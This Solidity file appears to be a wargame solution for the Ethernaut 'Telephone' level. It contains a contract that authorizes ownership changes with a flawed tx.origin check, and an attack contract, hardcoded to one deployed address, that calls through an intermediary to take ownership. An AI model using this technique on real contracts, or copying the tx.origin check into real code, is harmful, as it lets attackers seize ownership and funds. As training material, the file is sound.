// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHack {
    Telephone ogContract = Telephone(0x7569394FA796c21ECd4aDEB266a80f2804BE54F2);
    
    function callChangeOwner(address attacker) public {
        ogContract.changeOwner(attacker);
    }
}